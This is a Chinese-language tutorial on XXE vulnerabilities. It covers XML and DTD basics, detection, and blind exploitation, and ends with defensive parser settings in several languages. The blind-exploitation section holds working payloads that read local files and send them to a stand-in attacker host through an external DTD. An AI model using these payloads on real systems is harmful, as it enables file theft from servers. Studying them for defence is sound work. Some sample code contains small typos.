# XXE漏洞

## 1、XML基础知识

​		e<font color="red">X</font>tensible <font color="red">M</font>arkup <font color="red">L</font>anguage 可扩展标记语言

​		主要用途：配置文件、交换数据

```xml
<?xml version="1.0"?>   // XML声明
<TranInfo>		// XML根元素
    <CdtrInf>     //XML子元素
        <Nm>张三</Nm>
        <Id>6226097558881666</Id>
    </CdtrInf>
    <DbtrInf>
        <Id>6222083803003983</Id>
        <Nm>李四</Nm>
    </DbtrInf>
    <Amt>1000</Amt>
</TranInfo>
```

### 1.1 XML格式要求

- XML文档必须有根元素
- XML文档必须有关闭标签
- XML标签对大小写敏感
- XML元素必须被正确的嵌套
- XML属性必须加引号

### 1.2 XML格式校验

​	DTD（Document Type Definition）文档类型定义，可以单独一个文件，也可以写在XML文件内部

#### 1.2.1 元素ELEMENT

```dtd
<!DOCTYPE TranInfol[
<!ELEMENT TranInfo(CdtrInf,DbtrInf,Amt)>
<:!ELEMENT CdtrInf(Id,Nm)>
<!ELEMENT DbtrInf(Id,Nm)>
]>
```

#### 1.2.2 实体ENTITY

​	内部实体

```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name[
<!ELEMENT name ANY >
<!ENTITY cs "changsha" >
]>
<area>&cs;</area>
```

​	外部实体

```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name[
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///C:/test/test.dtd" >
]>
<area>&xxe;</area>
```
#### 1.2.3 外部实体引用协议：

| 协议 | 使用方式                                                   |
| ---- | ---------------------------------------------------------- |
| file | file:///etc//passwd                                        |
| php  | php://filter/read=convert.base64-encode/resource=index.php |
| html | http//:wuya.com/evil.dtd                                   |

不同语言支持的协议

| Libxml2         | PHP                                                          | Java                                                  | .NET                   |
| --------------- | ------------------------------------------------------------ | ----------------------------------------------------- | ---------------------- |
| file、http、ftp | file、http、ftp、php、compress.zli、b、compress.bz、ip2、data、glob、phar | file、http、https、jar、ftp、netdoc、mailto、gopher * | file、http、https、ftp |

### 1.3 完整的XML

```xml-dtd
<!-- 第-部分：XML声明部分 -->
<?xml version="1.0"?>

<!-- 第二部分：文档类型定义 DTD -->
<!DOCTYPE note[
<!-- 外部实体声明 -->
<!ENTITY entity-name SYSTEM "URI/URL">
]>

<!-- 第三部分：文档元素 -->
<note>
    <to>Dave</to>
    <from>GiGi</from>
    <head>Reminder</head>
<body>fish together</body>
</note>
```

## 2、XML外部实体注入漏洞

​		<font color="red">X</font>ML E<font color="red">x</font>ternal <font color="red">E</font>ntity Injection

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo[
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >
]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

### 2.1 XXE定义

​		如果Web应用的脚本代码没有限制XML引入外部实体，从而导致用户可以插入一个外部实体，并且其中的内容会被服务端执行，插入的代码可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。

### 2.2 检测XXE漏洞

- 第一步：判断是否以XML格式进行数据交换
- 第二步：判断是否实体是否会被解析
- 第三步：使用自己制作的接口或DNSlog判断服务器是否可以发起http请求
### 2.3 盲打
#### 2.3.1 DNS盲打
```xml-dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://aaabbb.fiaz.844.dnslog.cn" >
%remote;]>
```

#### 2.3.2 http接口参数，写入文件

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;]>
<root>&send;</root>
```
evil.dtd
```dtd
<!ENTITY % file SYSTEM
    "php://filter/read=convert.base64-encode/resource=file:///c:/system.ini">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM'http://192.168.142.135:8080?p=%file'>">
```

## 3、XXE漏洞防御

（1）禁止解析外部实体

```php
libxml_disable_entity_loader(true);  // 关键代码
$xml - simplexml_load_string($xmlContent);
```

```Java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);  // 关键代码
```

```nginx
XmlDocument doc = new XmlDocument();
doc.XmlResolver = null;    // 关键代码
```

```asp
Set xmldom = Server.CreateObject('MSXML.DOMDocument')
xmldom.resolveExternals = false  // 关键代码
```

```python
from lxml import stree
xmlData = stree.parse(xmlSource, stree.XMLParser(resolve_entities=False))
```


（2）过滤用户提交的XML数据``

（3）使用WAF
